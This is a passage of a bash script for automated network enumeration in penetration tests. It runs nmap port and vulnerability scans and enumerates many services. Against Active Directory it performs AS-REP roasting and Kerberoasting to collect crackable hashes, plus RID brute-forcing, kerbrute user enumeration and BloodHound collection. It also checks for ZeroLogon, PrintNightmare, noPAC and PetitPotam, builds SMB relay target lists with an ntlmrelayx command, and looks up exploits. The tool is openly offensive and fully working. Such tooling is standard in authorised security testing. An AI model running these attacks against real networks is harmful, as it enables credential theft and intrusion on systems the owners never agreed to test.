            UDP_OPEN=$(wc -l < "$BASE_DIR/udp_services.txt" 2>/dev/null || echo "0")
            [ "$UDP_OPEN" -gt 0 ] && log "SUCCESS" "Found $UDP_OPEN open UDP port(s)"
        fi

    done < "$BASE_DIR/live_hosts.txt"
}

_nmap_tcp_scan() {
    local host=$1
    if [ "$QUICK_SCAN" = "true" ]; then
        log "INFO" "Nmap: quick TCP scan (top 1000)..."
        nmap -sS $USE_PN -T4 --top-ports 1000 --open "$host" \
            -oN "$NMAP_DIR/tcp_scan.txt" 2>&1 | tee -a "$BASE_DIR/nmap.log" >/dev/null
    else
        log "INFO" "Nmap: full TCP port scan (65535)..."
        nmap -p- -sS $USE_PN -T4 --min-rate 1000 --open "$host" \
            -oN "$NMAP_DIR/tcp_scan.txt" 2>&1 | tee -a "$BASE_DIR/nmap.log" >/dev/null
    fi

    if [ -f "$NMAP_DIR/tcp_scan.txt" ]; then
        grep "^[0-9]*/tcp.*open" "$NMAP_DIR/tcp_scan.txt" | awk '{print $1}' | cut -d'/' -f1 | sort -nu > "$BASE_DIR/tcp_ports.txt"
        if [ -s "$BASE_DIR/tcp_ports.txt" ]; then
            TCP_PORTS=$(paste -sd, "$BASE_DIR/tcp_ports.txt")
            TCP_COUNT=$(wc -l < "$BASE_DIR/tcp_ports.txt")
            log "SUCCESS" "Found $TCP_COUNT open TCP port(s)"
        fi
    fi
}

################################################################################
# PHASE 3: VULNERABILITY SCANNING
################################################################################

phase_vulnerability_scan() {
    [ "$QUICK_SCAN" = "true" ] && return
    [ -z "$TCP_PORTS" ] && return

    log "SECTION" "Phase 3: Vulnerability Assessment"
    report_section "VULNERABILITY ASSESSMENT"

    nmap $USE_PN -sV -p "$TCP_PORTS" \
        --script "vuln and not (dos or exploit or brute)" \
        -iL "$BASE_DIR/live_hosts.txt" \
        -oN "$NMAP_DIR/vuln_scan.txt" 2>&1 | tee -a "$BASE_DIR/nmap.log" >/dev/null

    if [ -f "$NMAP_DIR/vuln_scan.txt" ] && grep -qi "VULNERABLE" "$NMAP_DIR/vuln_scan.txt"; then
        log "WARNING" "Vulnerabilities detected!"
        report "!!! VULNERABILITIES DETECTED !!!"
        grep -B 2 -A 5 "VULNERABLE" "$NMAP_DIR/vuln_scan.txt" >> "$REPORT"
    else
        report "No obvious vulnerabilities from NSE scripts"
    fi
}

################################################################################
# PHASE 4: DEEP SERVICE ENUMERATION
################################################################################

phase_deep_enumeration() {
    log "SECTION" "Phase 4: Deep Service Enumeration"
    report_section "SERVICE-SPECIFIC ENUMERATION"

    [ ! -s "$BASE_DIR/services.txt" ] && log "INFO" "No services to enumerate" && return

    grep -qi "21/tcp.*ftp\|21/tcp.*open" "$BASE_DIR/services.txt" && enum_ftp
    grep -qi "22/tcp.*ssh\|22/tcp.*open" "$BASE_DIR/services.txt" && enum_ssh
    grep -qiE "80/tcp|443/tcp|8080/tcp|8443/tcp|8000/tcp|8888/tcp" "$BASE_DIR/services.txt" && enum_http
    grep -qiE "25/tcp|465/tcp|587/tcp" "$BASE_DIR/services.txt" && enum_smtp
    grep -qiE "111/tcp|2049/tcp" "$BASE_DIR/services.txt" && enum_rpc_nfs
    grep -qiE "139/tcp|445/tcp" "$BASE_DIR/services.txt" && enum_smb
    grep -qiE "389/tcp|636/tcp|3268/tcp" "$BASE_DIR/services.txt" && enum_ldap
    grep -qi "1433/tcp" "$BASE_DIR/services.txt" && enum_mssql
    grep -qi "3306/tcp" "$BASE_DIR/services.txt" && enum_mysql
    grep -qi "5432/tcp" "$BASE_DIR/services.txt" && enum_postgresql
    grep -qi "27017/tcp" "$BASE_DIR/services.txt" && enum_mongodb
    grep -qi "6379/tcp" "$BASE_DIR/services.txt" && enum_redis
    grep -qi "3389/tcp" "$BASE_DIR/services.txt" && enum_rdp
    grep -qiE "5985/tcp|5986/tcp" "$BASE_DIR/services.txt" && enum_winrm

    # UDP services
    grep -qi "161/udp" "$BASE_DIR/udp_services.txt" 2>/dev/null && enum_snmp
    grep -qi "53/tcp\|53/udp" "$BASE_DIR/services.txt" "$BASE_DIR/udp_services.txt" 2>/dev/null && enum_dns

    # Kerberos + AD
    grep -qi "88/tcp" "$BASE_DIR/services.txt" && enum_kerberos
    if [ -n "$DOMAIN" ] || grep -qiE "88/tcp|389/tcp" "$BASE_DIR/services.txt"; then
        enum_active_directory
        enum_adcs
    fi
}

################################################################################
# SERVICE ENUMERATION FUNCTIONS (Concise)
################################################################################

enum_ftp() {
    log "INFO" "Enumerating FTP..."
    report_subsection "FTP (Port 21)"
    mkdir -p "$EVIDENCE_DIR/ftp"
    while read host; do
        timeout 15 ftp -n $host <<EOF > "$EVIDENCE_DIR/ftp/anon_${host}.txt" 2>&1
quote USER anonymous
quote PASS anonymous@
ls -la
bye
EOF
        if grep -qi "230.*logged" "$EVIDENCE_DIR/ftp/anon_${host}.txt"; then
            log "SUCCESS" "Anonymous FTP on $host"
            report "[+] Anonymous FTP Login on $host"
            report "  wget -r ftp://anonymous:anonymous@$host/"
        fi
        nmap -sV -p 21 --script "ftp-* and not brute" $USE_PN $host -oN "$EVIDENCE_DIR/ftp/nmap_${host}.txt" >/dev/null 2>&1
    done < "$BASE_DIR/live_hosts.txt"
}

enum_ssh() {
    log "INFO" "Enumerating SSH..."
    report_subsection "SSH (Port 22)"
    mkdir -p "$EVIDENCE_DIR/ssh"
    while read host; do
        SSH_BANNER=$(timeout 5 nc -nvw 3 $host 22 2>&1 | grep -i "ssh")
        report "Host: $host - Banner: $SSH_BANNER"
        command -v ssh-audit &>/dev/null && ssh-audit $host > "$EVIDENCE_DIR/ssh/audit_${host}.txt" 2>&1 &
        nmap -sV -p 22 --script "ssh-* and not brute" $USE_PN $host -oN "$EVIDENCE_DIR/ssh/nmap_${host}.txt" >/dev/null 2>&1
    done < "$BASE_DIR/live_hosts.txt"
}

enum_http() {
    log "INFO" "Enumerating HTTP/S..."
    report_subsection "HTTP/HTTPS"
    mkdir -p "$EVIDENCE_DIR/http"
    HTTP_PORTS=$(grep -oE "(80|443|8080|8443|8000|8888)/tcp" "$BASE_DIR/services.txt" | cut -d'/' -f1 | sort -u | tr '\n' ' ')
    while read host; do
        for port in $HTTP_PORTS; do
            [ "$port" = "443" ] || [ "$port" = "8443" ] && PROTO="https" || PROTO="http"
            URL="${PROTO}://${host}:${port}"
            report "Target: $URL"
            command -v whatweb &>/dev/null && whatweb -a 3 "$URL" > "$EVIDENCE_DIR/http/whatweb_${host}_${port}.txt" 2>&1
            nmap -sV -p $port --script "http-enum,http-title,http-headers,http-methods,http-robots.txt" $USE_PN $host -oN "$EVIDENCE_DIR/http/nmap_${host}_${port}.txt" >/dev/null 2>&1 &
            if [ "$WEB_ENUM" = "true" ] || [ "$QUICK_SCAN" != "true" ]; then
                command -v gobuster &>/dev/null && gobuster dir -u "$URL" -w /usr/share/wordlists/dirb/common.txt -o "$EVIDENCE_DIR/http/gobuster_${host}_${port}.txt" -t 20 -q --no-error -k 2>/dev/null &
            fi
            [ "$FULL_SCAN" = "true" ] && command -v nikto &>/dev/null && nikto -h "$URL" -o "$EVIDENCE_DIR/http/nikto_${host}_${port}.txt" -Format txt >/dev/null 2>&1 &
            grep -qi "wordpress\|wp-content" "$EVIDENCE_DIR/http/whatweb_${host}_${port}.txt" 2>/dev/null && \
                command -v wpscan &>/dev/null && wpscan --url "$URL" --enumerate vp,vt,u -o "$EVIDENCE_DIR/http/wpscan_${host}_${port}.txt" --format cli >/dev/null 2>&1 &
        done
    done < "$BASE_DIR/live_hosts.txt"
}

enum_smtp() {
    log "INFO" "Enumerating SMTP..."
    report_subsection "SMTP (Port 25/465/587)"
    mkdir -p "$EVIDENCE_DIR/smtp"
    while read host; do
        nmap -sV -p 25,465,587 --script "smtp-* and not brute" $USE_PN $host -oN "$EVIDENCE_DIR/smtp/nmap_${host}.txt" >/dev/null 2>&1 &
    done < "$BASE_DIR/live_hosts.txt"
}

enum_dns() {
    log "INFO" "Enumerating DNS..."
    report_subsection "DNS (Port 53)"
    mkdir -p "$EVIDENCE_DIR/dns"
    while read host; do
        [ -n "$DOMAIN" ] && dig axfr @$host $DOMAIN > "$EVIDENCE_DIR/dns/axfr_${host}.txt" 2>&1
        if [ -n "$DOMAIN" ] && grep -q "XFR size" "$EVIDENCE_DIR/dns/axfr_${host}.txt" 2>/dev/null; then
            log "SUCCESS" "Zone Transfer on $host!"
            report "[+] CRITICAL: Zone Transfer Allowed for $DOMAIN"
        fi
    done < "$BASE_DIR/live_hosts.txt"
}

enum_rpc_nfs() {
    log "INFO" "Enumerating RPC/NFS..."
    report_subsection "RPC/NFS (Port 111/2049)"
    mkdir -p "$EVIDENCE_DIR/nfs"
    while read host; do
        command -v showmount &>/dev/null && showmount -e $host > "$EVIDENCE_DIR/nfs/showmount_${host}.txt" 2>&1
        if grep -q "/" "$EVIDENCE_DIR/nfs/showmount_${host}.txt" 2>/dev/null; then
            log "SUCCESS" "NFS shares on $host"
            report "[+] NFS Exports:"
            cat "$EVIDENCE_DIR/nfs/showmount_${host}.txt" >> "$REPORT"
        fi
    done < "$BASE_DIR/live_hosts.txt"
}

enum_smb() {
    log "INFO" "Enumerating SMB..."
    report_subsection "SMB (Port 139/445)"
    mkdir -p "$EVIDENCE_DIR/smb"
    while read host; do
        # Signing check
        [ -n "$CME" ] && $CME smb $host 2>/dev/null | tee "$EVIDENCE_DIR/smb/signing_${host}.txt" >/dev/null
        grep -qi "signing:False" "$EVIDENCE_DIR/smb/signing_${host}.txt" 2>/dev/null && \
            log "SUCCESS" "SMB Signing NOT required on $host - Relay possible!" && \
            report "[+] CRITICAL: SMB Signing NOT Required on $host" && \
            echo "$host" >> "$EVIDENCE_DIR/smb/relay_targets.txt"

        # EternalBlue
        nmap -p 445 --script smb-vuln-ms17-010 $USE_PN $host -oN "$EVIDENCE_DIR/smb/eternalblue_${host}.txt" >/dev/null 2>&1
        grep -qi "VULNERABLE" "$EVIDENCE_DIR/smb/eternalblue_${host}.txt" 2>/dev/null && \
            log "CRITICAL" "ETERNALBLUE on $host" && report "[!!!] CRITICAL: ETERNALBLUE (MS17-010) on $host"

        # Anonymous
        smbclient -L //$host -N > "$EVIDENCE_DIR/smb/shares_${host}.txt" 2>&1
        grep -qi "Disk" "$EVIDENCE_DIR/smb/shares_${host}.txt" && report "[+] Anonymous SMB shares on $host"

        command -v smbmap &>/dev/null && smbmap -H $host > "$EVIDENCE_DIR/smb/smbmap_${host}.txt" 2>&1
        command -v enum4linux-ng &>/dev/null && enum4linux-ng -A $host -oA "$EVIDENCE_DIR/smb/enum4linux-ng_${host}" >/dev/null 2>&1 &

        # RID brute
        [ -n "$CME" ] && $CME smb $host -u '' -p '' --rid-brute 10000 > "$EVIDENCE_DIR/smb/rid_brute_${host}.txt" 2>&1 &

        # Auth enum
        if [ -n "$USERNAME" ] && [ -n "$PASSWORD" ]; then
            smbmap -H $host -u "$USERNAME" -p "$PASSWORD" -R > "$EVIDENCE_DIR/smb/smbmap_auth_${host}.txt" 2>&1 &
        fi
    done < "$BASE_DIR/live_hosts.txt"
}

enum_snmp() {
    log "INFO" "Enumerating SNMP..."
    report_subsection "SNMP (Port 161/162 UDP)"
    mkdir -p "$EVIDENCE_DIR/snmp"
    while read host; do
        command -v onesixtyone &>/dev/null && onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $host > "$EVIDENCE_DIR/snmp/community_${host}.txt" 2>&1
        for cs in public private manager; do
            timeout 10 snmpwalk -c $cs -v2c $host > "$EVIDENCE_DIR/snmp/walk_${cs}_${host}.txt" 2>&1
            if [ -s "$EVIDENCE_DIR/snmp/walk_${cs}_${host}.txt" ] && ! grep -q "Timeout" "$EVIDENCE_DIR/snmp/walk_${cs}_${host}.txt"; then
                log "SUCCESS" "SNMP community: $cs on $host"
                report "[+] Valid community string: $cs"
                snmpwalk -c $cs -v2c $host 1.3.6.1.2.1.25.4.2.1.2 > "$EVIDENCE_DIR/snmp/processes_${host}.txt" 2>&1 &
                snmpwalk -c $cs -v2c $host 1.3.6.1.4.1.77.1.2.25 > "$EVIDENCE_DIR/snmp/users_${host}.txt" 2>&1 &
                break
            fi
        done
    done < "$BASE_DIR/live_hosts.txt"
}

enum_ldap() {
    log "INFO" "Enumerating LDAP..."
    report_subsection "LDAP (Port 389/636)"
    mkdir -p "$EVIDENCE_DIR/ldap"
    while read host; do
        ldapsearch -x -H ldap://$host -s base namingcontexts > "$EVIDENCE_DIR/ldap/basedn_${host}.txt" 2>&1
        BASE_DN=$(grep "namingContexts:" "$EVIDENCE_DIR/ldap/basedn_${host}.txt" | head -1 | cut -d' ' -f2-)
        report "Base DN: $BASE_DN"
        ldapsearch -x -H ldap://$host -b "$BASE_DN" > "$EVIDENCE_DIR/ldap/anonymous_${host}.txt" 2>&1
        grep -qi "objectClass" "$EVIDENCE_DIR/ldap/anonymous_${host}.txt" && \
            log "SUCCESS" "LDAP anonymous bind on $host" && report "[+] Anonymous LDAP Bind"
        if [ -n "$USERNAME" ] && [ -n "$PASSWORD" ] && [ -n "$DOMAIN" ]; then
            command -v ldapdomaindump &>/dev/null && ldapdomaindump -u "${DOMAIN}\\${USERNAME}" -p "$PASSWORD" $host -o "$EVIDENCE_DIR/ldap/domaindump/" >/dev/null 2>&1 &
        fi
    done < "$BASE_DIR/live_hosts.txt"
}

enum_mssql() {
    log "INFO" "Enumerating MSSQL..."
    report_subsection "MSSQL (Port 1433)"
    mkdir -p "$EVIDENCE_DIR/mssql"
    while read host; do
        nmap -sV -p 1433 --script "ms-sql-* and not brute" $USE_PN $host -oN "$EVIDENCE_DIR/mssql/nmap_${host}.txt" >/dev/null 2>&1
        grep -qi "empty password" "$EVIDENCE_DIR/mssql/nmap_${host}.txt" && report "[!!!] SA empty password on $host"
    done < "$BASE_DIR/live_hosts.txt"
}

enum_mysql() {
    log "INFO" "Enumerating MySQL..."
    report_subsection "MySQL (Port 3306)"
    mkdir -p "$EVIDENCE_DIR/mysql"
    while read host; do
        nmap -sV -p 3306 --script "mysql-* and not brute" $USE_PN $host -oN "$EVIDENCE_DIR/mysql/nmap_${host}.txt" >/dev/null 2>&1
    done < "$BASE_DIR/live_hosts.txt"
}

enum_postgresql() {
    log "INFO" "Enumerating PostgreSQL..."
    report_subsection "PostgreSQL (Port 5432)"
    mkdir -p "$EVIDENCE_DIR/postgresql"
    while read host; do
        nmap -sV -p 5432 --script "pgsql-*" $USE_PN $host -oN "$EVIDENCE_DIR/postgresql/nmap_${host}.txt" >/dev/null 2>&1
    done < "$BASE_DIR/live_hosts.txt"
}

enum_mongodb() {
    log "INFO" "Enumerating MongoDB..."
    report_subsection "MongoDB (Port 27017)"
    mkdir -p "$EVIDENCE_DIR/mongodb"
    while read host; do
        nmap -sV -p 27017 --script "mongodb-*" $USE_PN $host -oN "$EVIDENCE_DIR/mongodb/nmap_${host}.txt" >/dev/null 2>&1
        command -v mongosh &>/dev/null && timeout 10 mongosh --host $host --eval "db.adminCommand('listDatabases')" > "$EVIDENCE_DIR/mongodb/test_${host}.txt" 2>&1
        grep -qi "databases" "$EVIDENCE_DIR/mongodb/test_${host}.txt" 2>/dev/null && report "[+] MongoDB unauthenticated access on $host"
    done < "$BASE_DIR/live_hosts.txt"
}

enum_redis() {
    log "INFO" "Enumerating Redis..."
    report_subsection "Redis (Port 6379)"
    mkdir -p "$EVIDENCE_DIR/redis"
    while read host; do
        command -v redis-cli &>/dev/null && timeout 5 redis-cli -h $host INFO > "$EVIDENCE_DIR/redis/info_${host}.txt" 2>&1
        grep -qi "redis_version" "$EVIDENCE_DIR/redis/info_${host}.txt" 2>/dev/null && \
            log "SUCCESS" "Unauthenticated Redis on $host" && report "[+] Unauthenticated Redis on $host"
    done < "$BASE_DIR/live_hosts.txt"
}

enum_rdp() {
    log "INFO" "Enumerating RDP..."
    report_subsection "RDP (Port 3389)"
    mkdir -p "$EVIDENCE_DIR/rdp"
    while read host; do
        nmap -sV -p 3389 --script "rdp-*" $USE_PN $host -oN "$EVIDENCE_DIR/rdp/nmap_${host}.txt" >/dev/null 2>&1
        grep -qi "CVE-2019-0708\|bluekeep" "$EVIDENCE_DIR/rdp/nmap_${host}.txt" && \
            log "CRITICAL" "BLUEKEEP on $host" && report "[!!!] BLUEKEEP (CVE-2019-0708) on $host"
    done < "$BASE_DIR/live_hosts.txt"
}

enum_winrm() {
    log "INFO" "Enumerating WinRM..."
    report_subsection "WinRM (Port 5985/5986)"
    mkdir -p "$EVIDENCE_DIR/winrm"
    while read host; do
        report "WinRM enabled on $host"
        if [ -n "$CME" ] && [ -n "$USERNAME" ] && [ -n "$PASSWORD" ]; then
            $CME winrm $host -u "$USERNAME" -p "$PASSWORD" > "$EVIDENCE_DIR/winrm/cme_${host}.txt" 2>&1
            grep -qi "Pwn3d" "$EVIDENCE_DIR/winrm/cme_${host}.txt" && report "[+] Admin WinRM access on $host"
        fi
    done < "$BASE_DIR/live_hosts.txt"
}

enum_kerberos() {
    log "INFO" "Enumerating Kerberos..."
    report_subsection "Kerberos (Port 88)"
    mkdir -p "$EVIDENCE_DIR/kerberos"
    while read host; do
        report "Kerberos on $host - likely DC"
        if command -v kerbrute &>/dev/null && [ -n "$DOMAIN" ]; then
            kerbrute userenum -d "$DOMAIN" --dc $host /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
                > "$EVIDENCE_DIR/kerberos/userenum_${host}.txt" 2>&1 &
        fi
    done < "$BASE_DIR/live_hosts.txt"
}

################################################################################
# ACTIVE DIRECTORY ENUMERATION
################################################################################

enum_active_directory() {
    [ -z "$DOMAIN" ] && return
    log "SECTION" "Active Directory Enumeration"
    report_section "ACTIVE DIRECTORY"
    mkdir -p "$EVIDENCE_DIR/ad"

    while read host; do
        report "Domain: $DOMAIN | DC: $host"

        # RID brute + users
        [ -n "$CME" ] && $CME smb $host -u '' -p '' --rid-brute 10000 > "$EVIDENCE_DIR/ad/rid_brute.txt" 2>&1
        grep "SidTypeUser" "$EVIDENCE_DIR/ad/rid_brute.txt" 2>/dev/null | awk -F'\\\\' '{print $2}' | awk '{print $1}' > "$EVIDENCE_DIR/ad/usernames.txt"
        USER_COUNT=$(wc -l < "$EVIDENCE_DIR/ad/usernames.txt" 2>/dev/null || echo "0")
        report "Users found: $USER_COUNT"

        # Password policy
        if [ -n "$CME" ] && [ -n "$USERNAME" ] && [ -n "$PASSWORD" ]; then
            $CME smb $host -u "$USERNAME" -p "$PASSWORD" --pass-pol > "$EVIDENCE_DIR/ad/passpol.txt" 2>&1
        fi

        # AS-REP Roasting
        if command -v impacket-GetNPUsers &>/dev/null && [ -s "$EVIDENCE_DIR/ad/usernames.txt" ]; then
            impacket-GetNPUsers "${DOMAIN}/" -dc-ip $host -usersfile "$EVIDENCE_DIR/ad/usernames.txt" \
                -format hashcat -outputfile "$EVIDENCE_DIR/ad/asrep_hashes.txt" > "$EVIDENCE_DIR/ad/asrep.txt" 2>&1
            [ -s "$EVIDENCE_DIR/ad/asrep_hashes.txt" ] && \
                log "SUCCESS" "AS-REP hashes found!" && report "[+] AS-REP Roastable accounts found"
        fi

        # Kerberoasting
        if [ -n "$USERNAME" ] && [ -n "$PASSWORD" ] && command -v impacket-GetUserSPNs &>/dev/null; then
            impacket-GetUserSPNs "${DOMAIN}/${USERNAME}:${PASSWORD}" -dc-ip $host -request \
                -outputfile "$EVIDENCE_DIR/ad/kerberoast_hashes.txt" > "$EVIDENCE_DIR/ad/kerberoast.txt" 2>&1
            [ -s "$EVIDENCE_DIR/ad/kerberoast_hashes.txt" ] && \
                log "SUCCESS" "Kerberoast hashes found!" && report "[+] Kerberoastable accounts found"
        fi

        # BloodHound
        if [ -n "$USERNAME" ] && [ -n "$PASSWORD" ] && command -v bloodhound-python &>/dev/null; then
            mkdir -p "$EVIDENCE_DIR/ad/bloodhound"
            bloodhound-python -d "$DOMAIN" -u "$USERNAME" -p "$PASSWORD" -ns $host -c All --zip \
                -o "$EVIDENCE_DIR/ad/bloodhound/" > "$EVIDENCE_DIR/ad/bloodhound.txt" 2>&1 &
            report "BloodHound collection running..."
        fi

    done < "$BASE_DIR/live_hosts.txt"
}

enum_adcs() {
    [ -z "$DOMAIN" ] && return
    log "INFO" "Enumerating ADCS..."
    report_subsection "ADCS (Certificate Services)"
    mkdir -p "$EVIDENCE_DIR/adcs"

    while read host; do
        if command -v certipy &>/dev/null && [ -n "$USERNAME" ] && [ -n "$PASSWORD" ]; then
            certipy find -u "${USERNAME}@${DOMAIN}" -p "$PASSWORD" -dc-ip $host \
                -output "$EVIDENCE_DIR/adcs/certipy" > "$EVIDENCE_DIR/adcs/certipy.txt" 2>&1
            for vuln in ESC1 ESC2 ESC3 ESC4 ESC6 ESC7 ESC8; do
                grep -qi "$vuln" "$EVIDENCE_DIR/adcs/"*txt 2>/dev/null && \
                    log "WARNING" "ADCS: $vuln" && report "[!] ADCS Vulnerability: $vuln"
            done
        fi
    done < "$BASE_DIR/live_hosts.txt"
}

################################################################################
# KNOWN VULNERABILITY CHECKS
################################################################################

phase_known_vulns() {
    [ -z "$CME" ] && return
    log "SECTION" "Known Vulnerability Checks"
    report_section "KNOWN VULNERABILITIES"

    while read host; do
        $CME smb $host -u '' -p '' -M zerologon > "$EVIDENCE_DIR/vulns/zerologon_${host}.txt" 2>&1
        grep -qi "VULNERABLE" "$EVIDENCE_DIR/vulns/zerologon_${host}.txt" && \
            log "CRITICAL" "ZeroLogon on $host!" && report "[!!!] ZeroLogon (CVE-2020-1472) on $host"

        if [ -n "$USERNAME" ] && [ -n "$PASSWORD" ]; then
            $CME smb $host -u "$USERNAME" -p "$PASSWORD" -M printnightmare > "$EVIDENCE_DIR/vulns/printnightmare_${host}.txt" 2>&1
            $CME smb $host -u "$USERNAME" -p "$PASSWORD" -M nopac > "$EVIDENCE_DIR/vulns/nopac_${host}.txt" 2>&1
            $CME smb $host -u "$USERNAME" -p "$PASSWORD" -M petitpotam > "$EVIDENCE_DIR/vulns/petitpotam_${host}.txt" 2>&1
            grep -qi "VULNERABLE" "$EVIDENCE_DIR/vulns/printnightmare_${host}.txt" && report "[!] PrintNightmare on $host"
            grep -qi "VULNERABLE" "$EVIDENCE_DIR/vulns/nopac_${host}.txt" && report "[!] noPAC on $host"
            grep -qi "VULNERABLE" "$EVIDENCE_DIR/vulns/petitpotam_${host}.txt" && report "[!] PetitPotam on $host"
        fi
    done < "$BASE_DIR/live_hosts.txt"
}

################################################################################
# SMB RELAY + EXPLOIT SEARCH
################################################################################

phase_smb_relay() {
    [ -z "$CME" ] && return
    report_section "SMB RELAY OPPORTUNITIES"
    $CME smb "$TARGET" --gen-relay-list "$EVIDENCE_DIR/relay/relay_targets.txt" 2>/dev/null
    if [ -s "$EVIDENCE_DIR/relay/relay_targets.txt" ]; then
        RELAY_COUNT=$(wc -l < "$EVIDENCE_DIR/relay/relay_targets.txt")
        report "[+] $RELAY_COUNT hosts without SMB signing"
        report "  ntlmrelayx.py -tf relay_targets.txt -smb2support -socks"
    fi
}

phase_exploit_search() {
    command -v searchsploit &>/dev/null || return
    log "INFO" "Searching exploits..."
    report_section "EXPLOIT SUGGESTIONS"

    [ ! -f "$NMAP_DIR/service_scan.txt" ] && return

    > "$BASE_DIR/search_terms.txt"
    grep "^[0-9]*/tcp.*open" "$NMAP_DIR/service_scan.txt" | while read line; do
        pv=$(echo "$line" | sed 's/.*open[[:space:]]*[^[:space:]]*[[:space:]]*//' | \
            grep -oE "^[A-Za-z][A-Za-z0-9_-]*[[:space:]]+[0-9]+\.[0-9][^\(]*" | \
            sed 's/[[:space:]]*$//' | head -1)
        [ -n "$pv" ] && [ ${#pv} -gt 3 ] && echo "$pv" >> "$BASE_DIR/search_terms.txt"
    done
    sort -u "$BASE_DIR/search_terms.txt" -o "$BASE_DIR/search_terms.txt" 2>/dev/null

    [ -s "$BASE_DIR/search_terms.txt" ] && while read term; do
        RESULT=$(searchsploit --disable-colour "$term" 2>/dev/null | grep -iv "Exploit Title\|Shellcodes\|Papers\|^$\|---" | head -5)
        [ -n "$RESULT" ] && report "[$term]" && echo "$RESULT" >> "$REPORT" && report ""
    done < "$BASE_DIR/search_terms.txt"
}

################################################################################
# CRITICAL FINDINGS SUMMARY
################################################################################

generate_summary() {
    log "INFO" "Generating summary..."

    SCRIPT_END=$(date +%s)
    ELAPSED=$((SCRIPT_END - SCRIPT_START))
    ELAPSED_MIN=$((ELAPSED / 60))
    ELAPSED_SEC=$((ELAPSED % 60))

    report ""
    report "################################################################################"
    report "# SCAN COMPLETE"
    report "################################################################################"
    report ""
    report "Duration: ${ELAPSED_MIN}m ${ELAPSED_SEC}s"
    report "Output: $BASE_DIR"
    report ""

    echo ""
    log "SUCCESS" "======================================================================="
    log "SUCCESS" "       ENUMERATION COMPLETE (${ELAPSED_MIN}m ${ELAPSED_SEC}s)"
    log "SUCCESS" "======================================================================="
    echo ""
    echo -e "${CYAN}Report:${NC}     $REPORT"
    echo -e "${CYAN}Evidence:${NC}   $EVIDENCE_DIR"
    echo -e "${CYAN}Nmap:${NC}       $NMAP_DIR"
    echo ""
    echo -e "${GREEN}Next:${NC} less $REPORT"
    echo ""

    JOBS_RUNNING=$(jobs -r 2>/dev/null | wc -l)
    [ "$JOBS_RUNNING" -gt 0 ] && log "INFO" "$JOBS_RUNNING background tasks still running"
}

################################################################################
# MAIN
################################################################################

main() {
    print_banner
    check_tools

    mkdir -p "$BASE_DIR" "$NMAP_DIR"
    EVIDENCE_DIR="$BASE_DIR/evidence"
    mkdir -p "$EVIDENCE_DIR" "$EVIDENCE_DIR/vulns" "$EVIDENCE_DIR/relay"

    report_init

    log "INFO" "Starting enumeration v${VERSION}..."
    log "INFO" "Target: $TARGET"
    [ -n "$DOMAIN" ] && log "INFO" "Domain: $DOMAIN"
    [ -n "$USERNAME" ] && log "INFO" "User: $USERNAME"
    [ "$CHECKLIST_MODE" = "true" ] && log "INFO" "Mode: CHECKLIST"
    echo ""

    # Phase 1: Discovery
    phase_host_discovery

    # Phase 2: Port Scan
    phase_port_scanning

    # If checklist mode, print commands and exit
    if [ "$CHECKLIST_MODE" = "true" ]; then
        while read host; do
            ALL_PORTS="$TCP_PORTS"
            # Add UDP ports
            if [ -s "$BASE_DIR/udp_services.txt" ]; then
                UDP_P=$(grep "^[0-9]*/udp.*open" "$BASE_DIR/udp_services.txt" | awk '{print $1}' | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//')
                [ -n "$UDP_P" ] && ALL_PORTS="${ALL_PORTS},${UDP_P}"
            fi
            print_checklist "$ALL_PORTS" "$host"
        done < "$BASE_DIR/live_hosts.txt"
        generate_summary
        exit 0
    fi

    # Standard mode: deep enumeration
    phase_vulnerability_scan
    phase_deep_enumeration
    sleep 2
    phase_known_vulns
    phase_smb_relay
    phase_exploit_search
    generate_summary
}

################################################################################
# ARGUMENT PARSING
################################################################################

QUICK_SCAN="false"
FULL_SCAN="false"
WEB_ENUM="false"
CHECKLIST_MODE="false"
USE_PN=""
DOMAIN=""
USERNAME=""
PASSWORD=""
HASH=""
CME=""
TCP_PORTS=""
TCP_COUNT=0
HAS_RUSTSCAN=false

while [ $# -gt 0 ]; do
    case $1 in
        -q|--quick)     QUICK_SCAN="true"; shift ;;
        -f|--full)      FULL_SCAN="true"; shift ;;
        -c|--checklist) CHECKLIST_MODE="true"; shift ;;
        -w|--web)       WEB_ENUM="true"; shift ;;
        -o|--output)    CUSTOM_OUTPUT="$2"; shift 2 ;;
        -d|--domain)    DOMAIN="$2"; shift 2 ;;
        -u|--username)  USERNAME="$2"; shift 2 ;;
        -p|--password)  PASSWORD="$2"; shift 2 ;;
        -H|--hash)      HASH="$2"; shift 2 ;;
        -h|--help)      usage ;;
        -*)             echo "Unknown: $1"; usage ;;
        *)              TARGET="$1"; shift ;;
    esac
done

[ -z "$TARGET" ] && usage

# Set CME binary
command -v nxc &>/dev/null && CME="nxc"

# Output directory
if [ -n "$CUSTOM_OUTPUT" ]; then
    BASE_DIR="$CUSTOM_OUTPUT"
else
    TIMESTAMP=$(date +%Y%m%d_%H%M%S)
    TARGET_SAFE=$(echo "$TARGET" | tr '/' '_' | tr ':' '_')
    BASE_DIR="enum_${TARGET_SAFE}_${TIMESTAMP}"
fi

NMAP_DIR="$BASE_DIR/nmap"
REPORT="$BASE_DIR/ENUM_REPORT.txt"

main
